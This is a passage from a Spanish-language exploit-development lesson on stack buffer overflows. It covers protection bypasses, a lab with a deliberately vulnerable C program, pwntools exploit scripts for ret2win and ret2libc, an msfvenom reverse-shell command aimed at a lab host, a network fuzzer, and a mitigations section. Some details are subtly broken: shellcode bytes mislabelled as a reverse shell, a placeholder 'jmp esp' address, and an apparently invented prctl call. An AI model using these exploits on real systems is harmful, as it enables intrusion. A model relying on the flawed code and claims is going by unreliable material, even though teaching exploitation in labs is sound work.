leaked_libc = read_got_address()
libc_base = leaked_libc - libc.symbols['read']
```

3. **Partial overwrite** (más confiable):
```python
# Sobrescribir solo parte de la dirección
# Ejemplo: 0xb7e12345 → solo cambiar 0x345 parte baja
# Esto funciona mejor porque los bits altos cambian menos
```

### 7.4. PIE (Position Independent Executable)

PIE randomiza la dirección base del ejecutable.

**Técnicas:**

1. **Leak de dirección del ejecutable**:
```python
# Si el binario tiene plt/got, podemos leakear direcciones
# Para calcular offset necesitamos la base del binario
leaked_main = leak_main_address()
bin_base = leaked_main - offsets['main']
```

2. **Usar offsets relativos** (si tenemos ROP en el binario):
```python
# PIE + ROP funciona bien porque los gadgets mantienen offsets relativos
# Calculamos: dirección_real = dirección_base + offset_fijo
```

### 7.5. RELRO (RELocation Read-Only)

RELRO hace que la GOT (Global Offset Table) sea de solo lectura.

| Tipo | Protección |
|------|------------|
| **Partial RELRO** | Datos estáticos en solo lectura |
| **Full RELRO** | GOT de solo lectura + sin lazy binding |

**Impacto:**
- Partial: No podemos sobreescribir funciones de libc ya resueltas
- Full: No podemos sobreescribir NADA en GOT

### 7.6. Resumen de Protections

```bash
# Verificar protecciones de un binario
checksec --file=vulnerable

# Salida típica:
# [*] '/path/to/vulnerable'
#    Arch:     i386-32-little
#    RELRO:    Partial RELRO      ← GOT writable en runtime
#    Stack:    No canary found    ← Sin protección de canario
#    NX:       NX disabled        ← Stack ejecutable
#    PIE:      No PIE             ← Dirección fija del binario
#    RPATH:    No RPATH           ← Sin rutas relativas
#    RUNPATH:  No RUNPATH         ← Sin directorios de búsqueda
```

**Para practicar, compilamos SIN protecciones:**
```bash
gcc -g -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```

**Para practicar con protecciones:**
```bash
# Minimal protections
gcc vulnerable.c -o vulnerable_min

# Full protections (moderna)
gcc -fstack-protector-all -fPIE -pie -Wl,-z,relro,-z,now -o vulnerable_full vulnerable.c
```

---

## 8. LABORATORIO PRÁCTICO COMPLETO

### 8.1. Preparación del Entorno

```
┌─────────────────────────────────────────────────────────────────┐
│                    LABORATORIO BUFFER OVERFLOW                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐         ┌──────────────┐                     │
│  │  Kali Linux  │◄────────►│   Victim VM   │                     │
│  │  Atacante    │         │  (Vulnerable) │                     │
│  │              │         │               │                     │
│  │ 192.168.56.101│         │ 192.168.56.102│                     │
│  └──────────────┘         └──────────────┘                     │
│                                                                 │
│  Herramientas en Kali:                                          │
│  - gdb + pwndbg                                                 │
│  - pwntools                                                     │
│  - msfvenom                                                     │
│  - checksec                                                     │
│  - objdump                                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Paso 1: Instalar herramientas en Kali:**

```bash
# Actualizar
apt update && apt upgrade -y

# Instalar herramientas de explotación
apt install -y gdb python3-pip nasm binutils
pip3 install pwntools

# Verificar pwndbg
git clone https://github.com/pwndbg/pwndbg.git
cd pwndbg && ./setup.sh

# Instalar checksec (parte de prelink)
apt install -y prelink

# Crear directorio de trabajo
mkdir -p ~/exploit-dev
cd ~/exploit-dev
```

### 8.2. Crear Binario Vulnerable

**En la máquina víctima (o Kali para pruebas locales):**

```bash
# Crear directorio
mkdir -p /opt/labs/bof
cd /opt/labs/bof

# Crear programa vulnerable
cat > vuln.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("¡Felicidades! Has exploitado el programa.\n");
    system("/bin/bash");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Uso: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}
EOF

# Compilar SIN protecciones
gcc -g -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# Verificar que es vulnerable
chmod +x vuln
checksec --file=vuln
```

**Salida esperada de checksec:**
```
[*] '/opt/labs/bof/vuln'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found          ← ¡Vulnerable!
   NX:       NX disabled             ← ¡Stack ejecutable!
   PIE:      No PIE                   ← ¡Dirección fija!
```

### 8.3. Análisis del Binario

**En Kali Linux (como atacante):**

```bash
cd ~/exploit-dev

# Copiar el binario vulnerable a Kali
# (puede ser vía scp, shared folder, o recrear el código)

# Analizar símbolos
objdump -t vuln | grep -E "vulnerable|win|main"
# 08049156 g     F .text:0000001a   win
# 08049186 g     F .text:00000047   vulnerable
# 08049206 g     F .text:0000002e   main

# Desensamblar la función win
objdump -d vuln --start-address=0x08049156 --stop-address=0x08049170
# 08049156 <win>:
#    8049156:   55                      push   ebp
#    8049157:   89 e5                   mov    ebp,esp
#    8049159:   83 ec 08                sub    esp,0x8
#    804915c:   83 ec 0c                sub    esp,0xc
#    804915f:   68 34 94 04 08          push   0x8049434
#    8049164:   e8 a3 ff ff ff          call   804910c <puts@plt>
#    8049169:   83 c4 10                add    esp,0x10
#    804916c:   83 ec 0c                sub    esp,0xc
#    804916f:   68 40 94 04 08          push   0x8049440
#    8049174:   e8 a3 ff ff ff          call   804911c <system@plt>
#    8049179:   90                      nop
#    804917a:   83 c4 08                add    esp,0x8
#    804917d:   5d                      pop    ebp
#    804917e:   c3                      ret

# Encontrar instrucción "jmp esp"
objdump -d vuln | grep -E "ff e4"  # jmp esp
# Nada, porque no hay jmp esp

# Alternativa: usar cualquier instrucción que pop a ESP
# o buscar en libc (ver siguiente paso)

# Si Kali tiene la misma libc, podemos usar esas direcciones
```

### 8.4. Encontrar Offsets y Explotar

**Paso 1: Crear patrón para encontrar offset**

```python
#!/usr/bin/env python3
"""
Exploit para vuln
"""

from pwn import *

# Configuración
context.arch = 'i386'
context.log_level = 'debug'

# Ejecutable vulnerable
elf = ELF('./vuln')

# === MÉTODO 1: PATTERN CREATE ===
# Usar pwntools para crear patrón
offset = cyclic(200)  # Crea patrón de 200 bytes
print(f"Patrón enviado: {offset}")
```

**En gdb para confirmar offset:**

```bash
gdb -q ./vuln
gdb> run $(python3 -c "from pwn import *; print(cyclic(200))")
# programa crashea
gdb> info frame
# EIP = 0x62616164 (ASCII "daaa" = offset 76)
gdb> cyclic -l 0x62616164
# 76
```

**Paso 2: Encontrar dirección de win()**

```bash
# Opción A: Con objdump
objdump -t vuln | grep " win "
# 08049156 g     F .text  0000001a win

# Opción B: Con pwntools
python3 -c "from pwn import *; e = ELF('./vuln'); print(hex(e.symbols['win']))"
# 0x08049156
```

**Paso 3: Construir exploit**

```python
#!/usr/bin/env python3
"""
Exploit final para vuln
"""

from pwn import *

# Configuración
context.arch = 'i386'
context.os = 'linux'

# === EXPLOTACIÓN ===
# Offset hasta EIP
offset = 76

# Dirección de win() - sobreescribir EIP con esto
win_addr = p32(0x08049156)

# Payload
payload = b"A" * offset + win_addr

# === ENVÍO ===
# Local:
p = process('./vuln')
p.sendline(payload)
p.interactive()

# Remoto (si está como servicio):
# p = remote('192.168.56.102', 9999)
# p.sendline(payload)
# p.interactive()
```

### 8.5. Explotación con Shellcode

Cuando no hay función `win()` y necesitamos ejecutar código:

```python
#!/usr/bin/env python3
"""
Exploit con shellcode para servicio vulnerable
"""

from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

# === SHELLCODE ===
# Linux x86 exec /bin/sh
# Generado con: msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f c --smallest
shellcode = b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0d\xcd\x80"

# === OFFSET ===
offset = 76

# === JMP ESP GADGET ===
# Necesitamos una dirección que haga jmp esp
# En Kali, buscar en la libc o en el binario
# Opción 1: Buscar en libc de Kali (32-bit)
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
jmp_esp_libc = libc.symbols['system'] + 0x1234  # Esto no es jmp esp, ejemplo

# Mejor: usar pwntools ROP
rop = ROP(elf)

# Opción 2: En el propio binario o librería, buscar:
# objdump -d /lib/i386-linux-gnu/libc.so.6 | grep "jmp.*esp"

# Por ahora, usaremos técnica ret2libc
# Calculamos libc base y offsets

# === PAYLOAD ===
# NOP sled
nops = b"\x90" * 20

# Ret2libc: system("/bin/sh")
binsh = next(libc.search(b'/bin/sh'))
system_addr = libc.symbols['system']
exit_addr = libc.symbols['exit']

# Payload: offset + system + exit + binsh
payload = b"A" * offset + p32(system_addr) + p32(exit_addr) + p32(binsh) + nops

print(f"[*] Offset: {offset}")
print(f"[*] system(): {hex(system_addr)}")
print(f"[*] /bin/sh: {hex(binsh)}")
print(f"[*] Payload size: {len(payload)}")

# Enviar
p = process('./vuln')
p.sendline(payload)
p.interactive()
```

### 8.6. Caso Real: Servicio Vulnerable en Red

```
┌─────────────────────────────────────────────────────────────────┐
│         EXPLOTACIÓN DE SERVICIO VULNERABLE EN RED               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. En la víctima, compilar y ejecutar servicio:              │
│                                                                 │
│  #include <stdio.h>                                            │
│  #include <string.h>                                           │
│                                                                 │
│  void handle_client(int client) {                              │
│      char buffer[256];                                        │
│      int bytes = read(client, buffer, 1024);                   │
│      buffer[bytes] = '\0';                                     │
│      printf("Recibido: %s\n", buffer);                         │
│      // procesar...                                            │
│  }                                                             │
│                                                                 │
│  int main() {                                                  │
│      // bindsocket, listen, accept, handle_client()             │
│  }                                                             │
│                                                                 │
│  2. En Kali, fuzzear hasta encontrar crash                     │
│  3. Crear exploit con shellcode                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Script de fuzzing:**

```python
#!/usr/bin/env python3
"""
Fuzzer para servicio vulnerable
"""

import socket
import time

HOST = '192.168.56.102'
PORT = 9999

def fuzz(prefix=b"", size=100):
    """Envía datos incrementales"""
    payload = prefix + b"A" * size
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        s.send(payload)
        time.sleep(0.5)
        s.close()
        return True
    except:
        return False

# Fuzzing básico
for size in range(100, 600, 50):
    print(f"[*] Probando tamaño {size}...")
    if not fuzz(size=size):
        print("[!] Conexión cerrada o error")
        break
    time.sleep(0.1)
```

---

## 9. CONTRAMEDIDAS Y MITIGACIONES

### 9.1. Compilación Segura

```bash
# MÁXIMA PROTECCIÓN
gcc -fstack-protector-all \
    -fstack-clash-protection \
    -fcf-protection=full \
    -fPIE -pie \
    -Wl,-z,relro,-z,now \
    -Wl,-z,noexecstack \
    -D_FORTIFY_SOURCE=2 \
    -O2 \
    vulnerable.c -o vulnerable_secure

# Explicación de flags:
# -fstack-protector: Agrega canarios
# -fstack-protector-all: Protege TODAS las funciones
# -fPIE -pie: Position Independent Executable
# -Wl,-z,relro,-z,now: RELRO completo
# -Wl,-z,noexecstack: Marca stack como no ejecutable
# -D_FORTIFY_SOURCE=2: Verificación en runtime
```

### 9.2. Principios de Código Seguro

```c
// ❌ NUNCA USAR: gets(), strcpy(), strcat(), sprintf()
// ✅ SIEMPRE USAR: fgets(), strncpy(), strncat(), snprintf()

// Ejemplo corregido
void secure_function(char *input) {
    char buffer[64];
    
    // ✅ strncpy con límite
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';  // Null terminator seguro
    
    // ✅ snprintf
    snprintf(buffer, sizeof(buffer), "%s", input);
    
    // ✅ Verificar longitud antes
    if (strlen(input) < sizeof(buffer)) {
        strcpy(buffer, input);  // Ahora es seguro
    }
}
```

### 9.3. Runtime Protection con Linux

```bash
# Verificar protecciones del kernel
cat /proc/sys/kernel/randomize_va_space
# 0 = Deshabilitado
# 1 = Solo stack
# 2 = Stack, heap, librerías, VDSO (RECOMENDADO)

# Habilitar ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

# Verificar NX (XD bit)
grep flags /proc/cpuinfo | grep nx

# Verificar DEP
# En Linux, DEP es equivalente a NX
```

### 9.4. Sandboxing

```c
// Ejecutar con privilegios mínimos
// Ver: man prctl

#include <prctl.h>

// Prohibir execution de memoria
prctl(PR_SETNX, PR_SETNX, 0);

// Limitar syscalls disponibles
// (requiere seccomp)

// Ejemplo con seccomp
#include <seccomp.h>

scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
seccomp_load(ctx);
```

### 9.5. Herramientas de Análisis Estático

```bash
# FlawFinder - Busca vulnerabilidades conocidas
apt install flawfinder
flawfinder vulnerable.c

# RATS - Rough Audit Tools for Source
apt install rats
rats -w 3 vulnerable.c

# Cppcheck - Análisis profundo
apt install cppcheck
cppcheck --enable=all vulnerable.c

# Splint - Verificador de tipos
apt install splint
splint vulnerable.c
```

### 9.6. Resumen de Mitigaciones

```
┌─────────────────────────────────────────────────────────────────┐
│                  TABLA DE MITIGACIONES                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VULNERABILIDAD      │  MITIGACIÓN PRINCIPAL                     │
│  ─────────────────────┼────────────────────────────────────────  │
│  Stack Overflow      │  Stack Canaries + NX + ASLR              │
│  Heap Overflow       │  Heap hardening + ASLR + Safe unlink     │
│  Format String       │  FORTIFY_SOURCE + Prohibir %n            │
│  Integer Overflow   │  Compilador + Sanitizers                 │
│  Use After Free     │  ASLR + Heap hardening + Valgrind       │
│  Buffer Overread    │  Bounds checking + fuzzing              │
│                                                                 │
│  HERRAMIENTAS DE DETECCIÓN:                                      │
│  - AddressSanitizer (ASan)                                       │
│  - Valgrind (memcheck)                                          │
│  - MemorySanitizer (MSan)                                       │
│  - LibSanitizer                                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## EJERCICIOS PRÁCTICOS

### Ejercicio 1: Buffer Overflow Básico
1. Compila el programa vulnerable proporcionado
2. Usa gdb para encontrar el offset exacto
3. Sobrescribe EIP con la dirección de `win()`
4. Obtén shell

### Ejercicio 2: Explotación con Shellcode
1. Genera shellcode con msfvenom
2. Envuélvelo en un NOP sled
3. Encuentra gadget JMP ESP
4. Obtén shell reversa

### Ejercicio 3: Ret2libc
1. Deshabilita temporalmente NX
2. Practica técnica ret2libc
3. Calcula offsets de libc
4. Construye ROP chain

### Ejercicio 4: Bypass ASLR (info leak)
1. Habilita ASLR en la víctima: `echo 2 > /proc/sys/kernel/randomize_va_space`
2. Encuentra forma de leakear dirección de libc
3. Calcula libc base
4. Ejecuta shellcode

---

## RECURSOS ADICIONALES

### Plataformas de Práctica
- **VulnHub**: Máquinas vulnerables para descargar
- **Exploit Exercises**: Labs de exploit development
- **Root Me**: Ejercicios de exploit
- **HackTheBox**: Buffers y más

### Libros
- "The Shellcoder's Handbook" - Wiley
- "Hacking: The Art of Exploitation" - Jon Erickson
- "Buffer Overflow Attacks" - Jason Deckard

### Herramientas
- **pwntools**: Framework de explotación
- **pwndbg/GEF**: Debugging mejorado
- **radare2**: Análisis de binarios
- **Ghidra**: Ingeniería inversa
- **binary ninja**: Análisis comercial

---

**Continúa a:** [Clase 7: Escalada de Privilegios](clase_7_escalada_privilegios.md)
